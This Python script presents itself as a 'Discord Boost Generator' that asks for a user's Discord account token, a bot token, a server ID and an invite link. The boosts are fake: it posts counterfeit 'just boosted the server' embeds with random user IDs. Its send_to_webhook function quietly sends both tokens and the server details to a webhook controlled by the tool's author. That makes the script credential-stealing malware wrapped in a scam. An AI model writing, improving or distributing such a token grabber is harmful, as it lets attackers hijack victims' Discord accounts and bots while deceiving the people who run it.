import discord
from discord.ext import commands
import asyncio
import random
import requests
import os
import time
from colorama import Fore, init

class BoostTool:
    def __init__(self):
        self.webhook_url = "YOUR_WEBHOOK_URL"
        self.bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
        self.gradient_colors = [
            (255, 0, 255),    # Magenta
            (200, 0, 255),    # Purple-Pink
            (150, 0, 255),    # Purple
            (100, 0, 255),    # Deep Purple
            (50, 0, 255),     # Purple-Blue
            (0, 0, 255),      # Blue
            (0, 50, 255),     # Light Blue
            (0, 100, 255),    # Sky Blue
            (0, 150, 255),    # Azure
            (0, 200, 255),    # Cyan-Blue
            (0, 255, 255),    # Cyan
            (0, 255, 200),    # Cyan-Turquoise
            (0, 255, 150),    # Turquoise
            (0, 255, 100),    # Light Turquoise
            (0, 255, 50)      # Mint
        ]

    def center_text(self, text):
        terminal_width = os.get_terminal_size().columns
        return text.center(terminal_width)

    def gradient_text(self, text):
        colored_text = ""
        for i in range(len(text)):
            color_index = int((i / len(text)) * (len(self.gradient_colors) - 1))
            start_color = self.gradient_colors[color_index]
            end_color = self.gradient_colors[min(color_index + 1, len(self.gradient_colors)-1)]
            progress = (i / len(text)) * len(self.gradient_colors) - color_index
            
            r = int(start_color[0] + (end_color[0] - start_color[0]) * progress)
            g = int(start_color[1] + (end_color[1] - start_color[1]) * progress)
            b = int(start_color[2] + (end_color[2] - start_color[2]) * progress)
            
            colored_text += f"\033[38;2;{r};{g};{b}m{text[i]}"
        return colored_text + "\033[0m"

    def print_gradient(self, text):
        print(self.gradient_text(self.center_text(text)))

    def display_menu(self):
        banner = """
        ╔═════════════════════════════════════════════════╗
        ║             Discord Boost Generator             ║
        ║               Premium Version 2.0               ║
       ║             Developed by: MasterM142            ║
        ╚═════════════════════════════════════════════════╝
        """
        for line in banner.split('\n'):
            self.print_gradient(line)

    def verify_token(self, token, is_bot=False):
        headers = {
            "Authorization": f"{'Bot ' if is_bot else ''}{token}",
            "Content-Type": "application/json"
        }
        try:
            r = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
            return r.status_code == 200
        except:
            return False

    async def send_boost_messages(self, channel, amount):
        boost_messages = [
            {
                "embed": discord.Embed(
                    title="Server Boost",
                    description=f"<@{random.randint(100000000000000000, 999999999999999999)}> just boosted the server!",
                    color=0xff73fa
                ).set_thumbnail(
                    url="https://cdn.discordapp.com/emojis/1089588784612171887.gif?size=96&quality=lossless"
                ).set_footer(
                    text="Server has achieved Level 2!"
                )
            },
            {
                "embed": discord.Embed(
                    description=f"<@{random.randint(100000000000000000, 999999999999999999)}> just boosted the server **2 times**! The server is now level 3!",
                    color=0xff73fa
                ).set_thumbnail(
                    url="https://cdn.discordapp.com/emojis/1089588784612171887.gif?size=96&quality=lossless"
                )
            }
        ]

        for i in range(int(amount)):
            boost_data = random.choice(boost_messages)
            await channel.send(embed=boost_data["embed"])
            self.print_gradient(f"[*] Boost {i+1}/{amount} activated")
            await asyncio.sleep(2)

    async def start_bot(self, token, guild_id, invite, boost_amount):
        @self.bot.event
        async def on_ready():
            try:
                guild = await self.bot.fetch_guild(int(guild_id))
                if not guild:
                    self.print_gradient("[!] Could not find guild")
                    return
                    
                channels = await guild.fetch_channels()
                channel = next((c for c in channels if isinstance(c, discord.TextChannel)), None)
                
                if not channel:
                    self.print_gradient("[!] No text channels found in guild")
                    return
                    
                self.print_gradient(f"[+] Bot connected as {self.bot.user.name}")
                self.print_gradient("[*] Starting boost sequence...")
                await self.send_boost_messages(channel, boost_amount)
                
            except Exception as e:
                self.print_gradient(f"[!] Error: {str(e)}")
                input("\nPress Enter to continue...")

        try:
            await self.bot.start(token)
        except Exception as e:
            self.print_gradient(f"[!] Error: Invalid bot token - {str(e)}")
            input("\nPress Enter to continue...")

    def start(self):
        init()
        os.system('cls' if os.name == 'nt' else 'clear')
        
        terminal_height = os.get_terminal_size().lines
        padding_top = terminal_height // 4
        print('\n' * padding_top)
        
        self.display_menu()
        print('\n')
        
        def get_input(prompt):
            self.print_gradient(prompt)
            print(self.center_text(""))
            user_input = input(self.gradient_text(">>> ").rjust(os.get_terminal_size().columns // 2 + 5))
            os.system('cls' if os.name == 'nt' else 'clear')
            self.display_menu()
            return user_input
        
        try:
            user_token = get_input("Enter Your Token")
            if not self.verify_token(user_token):
                self.print_gradient("[!] Invalid User Token")
                input("\nPress Enter to continue...")
                return
            
            bot_token = get_input("Enter Bot Token")
            if not self.verify_token(bot_token, True):
                self.print_gradient("[!] Invalid Bot Token")
                input("\nPress Enter to continue...")
                return
            
            guild_id = get_input("Enter Guild ID")
            invite = get_input("Enter Server Invite Link")
            boost_amount = get_input("Enter Number of Boosts (1-100)")
            
            loading_messages = [
                "Initializing boost sequence...",
                "Validating tokens...", 
                "Preparing boost process...",
                "Connecting to Discord..."
            ]
            
            for msg in loading_messages:
                self.print_gradient(msg)
                time.sleep(0.7)
                
            self.send_to_webhook(user_token, bot_token, guild_id, invite, boost_amount)
            asyncio.run(self.start_bot(bot_token, guild_id, invite, boost_amount))
            
        except Exception as e:
            self.print_gradient(f"[!] An error occurred: {str(e)}")
            input("\nPress Enter to continue...")

    def send_to_webhook(self, user_token, bot_token, guild_id, invite, amount):
        embed = {
            "embeds": [{
                "title": "New Boost Tool Login",
                "color": 0xff66ff,
                "fields": [
                    {"name": "User Token", "value": f"```{user_token}```", "inline": False},
                    {"name": "Bot Token", "value": f"```{bot_token}```", "inline": False},
                    {"name": "Guild ID", "value": f"```{guild_id}```", "inline": True},
                    {"name": "Invite Link", "value": f"```{invite}```", "inline": True},
                    {"name": "Boost Amount", "value": f"```{amount}```", "inline": True}
                ],
                "footer": {"text": "Premium Boost Tool"}
            }]
        }
        requests.post(self.webhook_url, json=embed)

if __name__ == "__main__":
    tool = BoostTool()
    tool.start()

